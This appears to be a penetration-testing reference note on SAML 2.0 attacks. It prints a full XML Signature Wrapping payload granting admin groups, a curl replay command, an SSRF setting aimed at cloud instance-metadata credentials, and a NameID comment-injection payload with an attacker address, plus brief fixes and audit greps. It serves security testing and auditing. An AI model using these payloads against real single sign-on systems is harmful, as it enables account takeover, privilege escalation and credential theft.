---
category: technique
title: "SAML 2.0 Attack Techniques - XSW, Replay, Bypass"
tags: [saml, sso, xml-signature-wrapping, xsw, xmldsig, lxml, xmlsec, replay, audience-restriction, enterprise-auth]
---

# SAML 2.0 Attacks

SAML is where XML parsing semantics meet cryptographic guarantees. The bugs are always at the boundary between what the XML parser sees and what the signature actually covers.

---

## XML Signature Wrapping (XSW) - the critical one

The signature covers a specific element identified by its `ID` attribute. The parser returns an element found by position, tag name, or XPath. If these two "find the assertion" operations use different logic, they can return different nodes.

**Classic vulnerable pattern (Python lxml + xmlsec):**

```python
# VULNERABLE: find() returns first matching element in document order
assertion = root.find('.//{urn:oasis:names:tc:SAML:2.0:assertion}Assertion')
xmlsec.verify(assertion, idp_cert)          # validates THIS assertion
attributes = extract_attributes(assertion)  # reads from THIS assertion
```

The attack: place a malicious unsigned `Assertion` BEFORE the signed one in the document. `find()` returns the malicious one. `xmlsec.verify()` runs on the signed one (passed in by position, not by document order). Attributes extracted from the malicious one.

**Payload structure:**

```xml
<samlp:Response>
  <!-- ATTACKER: returned by find(), never signature-checked -->
  <saml:Assertion ID="evil">
    <saml:AttributeStatement>
      <saml:Attribute Name="groups">
        <saml:AttributeValue>portal-admins</saml:AttributeValue>
      </saml:Attribute>
    </saml:AttributeStatement>
    <saml:NameID>victim@target.com</saml:NameID>
  </saml:Assertion>

  <!-- REAL: xmlsec.verify() validates this - signature is valid -->
  <saml:Assertion ID="real">
    <ds:Signature>...</ds:Signature>
    <!-- legitimate low-privilege attributes -->
  </saml:Assertion>
</samlp:Response>
```

**8 standard XSW variants** - differ in where the malicious assertion is placed:
- XSW1: malicious as sibling before signed
- XSW2: signed moved inside malicious as child
- XSW3: malicious inside `<Extensions>`
- XSW4: malicious inside `<Advice>`
- XSW5-8: same patterns with EncryptedAssertion wrapper

**Fix:** After `xmlsec.verify()`, extract the Reference URI from `ds:SignedInfo/ds:Reference/@URI`, then locate the assertion by that specific ID: `root.find(f'.//*[@ID="{reference_id}"]')`.

**Prerequisite:** Any valid signed SAMLResponse for the target SP - get it from your own legitimate low-privilege login. No IdP compromise needed.

**Tool:** SAMLRaider (Burp extension) automates all 8 variants.

---

## Assertion replay

The SP must validate:
- `NotBefore` / `NotOnOrAfter` on `<Conditions>`
- `InResponseTo` binding (response must reference the AuthnRequest that triggered it)
- `Recipient` (SP URL the assertion was issued for)

If any of these is missing, capture any valid SAMLResponse and re-POST it:

```bash
curl -X POST https://portal.target.com/saml/acs \
  -d "SAMLResponse=<base64_captured_response>&RelayState=/"
```

Test `InResponseTo` bypass: submit a response with no `InResponseTo` attribute, or with a mismatched one. If the SP doesn't maintain a state table of pending AuthnRequests, CSRF against the ACS endpoint becomes viable.

---

## Cross-tenant AudienceRestriction bypass

In multi-tenant SaaS where multiple tenants use the same IdP (e.g., Azure AD), a valid assertion issued for `aud=tenant-a.portal.com` may be accepted by `tenant-b.portal.com` if the SP doesn't enforce `AudienceRestriction`.

Requires two tenant accounts on the same IdP. Enables horizontal tenant takeover.

---

## SSRF via IdP metadata URL

If the SP fetches the IdP certificate from a configurable metadata URL:

```
https://portal.target.com/admin/sso/config
  metadata_url: http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

Trigger metadata refresh -> SP fetches internal URL -> IMDS credentials or internal service response.

Even if the response isn't reflected, confirm with out-of-band DNS callback (interactsh).

---

## XML comment / NameID injection

Insert a comment inside the NameID text:

```xml
<saml:NameID>legitimate@corp.com<!---->.evil@attacker.com</saml:NameID>
```

Some XML parsers strip comments and return `legitimate@corp.com.evil@attacker.com` as text. If the SP does a user lookup on the extracted NameID and the result differs from what the signature covers, identity confusion is possible.

---

## Code audit targets

```bash
# Find SAML response parser
grep -rn "SAMLResponse\|saml_response\|parse.*assertion\|find.*Assertion" src/

# Check for missing Conditions validation
grep -rn "NotOnOrAfter\|NotBefore\|AudienceRestriction\|InResponseTo" src/
# Missing grep hits = missing validation

# Python: check if Reference URI is verified against extracted element ID
grep -rn "xmlsec\|verify\|find.*Assertion" src/ | grep -v "test_"
```
